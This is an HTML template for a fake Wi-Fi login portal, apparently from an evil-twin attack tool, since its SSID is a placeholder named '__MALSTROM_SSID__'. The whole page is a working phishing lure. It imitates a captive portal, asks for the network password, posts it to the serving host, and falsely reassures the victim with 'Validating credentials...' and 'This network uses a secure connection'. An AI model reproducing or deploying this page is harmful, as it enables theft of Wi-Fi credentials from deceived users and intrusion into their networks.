<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connect to Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0b0f14;color:#e6edf3;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#11161d;border:1px solid #2a313a;border-radius:14px;padding:36px 32px;width:100%;max-width:400px;box-shadow:0 18px 50px rgba(0,0,0,.55)}
.icon{width:64px;height:64px;margin:0 auto 24px;border-radius:50%;background:#1c232c;display:flex;align-items:center;justify-content:center}
.icon svg{width:32px;height:32px;fill:#7aa2d1}
h1{font-size:19px;font-weight:600;text-align:center;margin-bottom:6px}
p.sub{color:#8b949e;font-size:13px;text-align:center;margin-bottom:26px}
label{display:block;font-size:12px;color:#8b949e;margin-bottom:6px;letter-spacing:.3px}
input[type=password]{width:100%;background:#0c1016;border:1px solid #2a313a;border-radius:8px;padding:12px 14px;color:#e6edf3;font-size:15px;outline:none}
input[type=password]:focus{border-color:#4c8dff}
button{width:100%;background:#2f6df6;border:none;border-radius:8px;padding:13px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;margin-top:16px}
button:active{background:#2758c6}
.msg{display:none;text-align:center;font-size:14px;color:#4c8dff;margin-top:16px}
.foot{text-align:center;font-size:11px;color:#5b6470;margin-top:24px}
</style>
</head>
<body>
<div class="card">
  <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2A8 8 0 0 1 20 12a8 8 0 0 1-8 8 8 8 0 0 1-8-8A8 8 0 0 1 12 4m0 2a6 6 0 0 0-6 6 6 6 0 0 0 6 6 6 6 0 0 0 6-6 6 6 0 0 0-6-6m0 2a4 4 0 0 1 4 4 4 4 0 0 1-4 4 4 4 0 0 1-4-4 4 4 0 0 1 4-4z"/></svg></div>
  <h1>Connect to Wi-Fi</h1>
  <p class="sub">Enter the password to join "__MALSTROM_SSID__"</p>
  <form id="f" action="/" method="post">
    <label for="password">Wi-Fi password</label>
    <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
    <button type="submit">Connect</button>
  </form>
  <div class="msg" id="msg">Validating credentials...</div>
  <div class="foot">This network uses a secure connection</div>
</div>
<script>
document.getElementById('f').addEventListener('submit',function(){document.getElementById('msg').style.display='block'});
</script>
</body>
</html>
